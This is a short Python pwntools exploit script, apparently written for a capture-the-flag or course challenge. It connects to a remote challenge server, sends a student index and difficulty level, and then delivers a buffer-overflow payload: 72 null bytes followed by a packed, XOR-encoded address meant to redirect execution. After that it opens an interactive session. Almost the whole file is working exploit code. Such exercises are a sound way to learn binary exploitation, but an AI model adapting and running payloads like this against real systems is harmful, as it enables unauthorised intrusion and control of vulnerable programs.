#!/usr/bin/env python3
from pwn import *

exe = ELF("./easy")
#exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
#exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"431552"

val1 = b'4'
val2 = b'80'
msg1 = b'a' * (4)
msg2 = b'\0' * (72) + p64(0x00401b3f ^ 0x401890)
# msg2 = b'\0' * (80) + b'\n'

def conn():
    # r = process([exe.path, index_number])

    # gdb.attach(r)

    # r.sendline(val1)
    # print(val1)
    # r.sendline(msg1)
    # print(msg1)

    # r.sendline(val2)
    # print(val2)
    # r.sendline(msg2)
    # print(msg2)    
    # x = r.recvn(150)
    # payload = val1 + b'\n' + msg1 + b'\n'+ val2 + b'\n' + msg2
    # r = process([exe.path, index_number])
    # r.sendline(payload)
    diff = b'3' + b'\n'

    r = remote("bsk.bonus.re", 13337)
    r.sendline(index_number)
    r.sendline(diff)
    # r.sendline(payload)

    r.sendline(val1)
    print(val1)
    r.sendline(msg1)
    print(msg1)

    r.sendline(val2)
    print(val2)
    r.sendline(msg2)
    print(msg2)    

    return r


def main():
    r = conn()
    # good luck!
    r.interactive()


if __name__ == "__main__":
    main()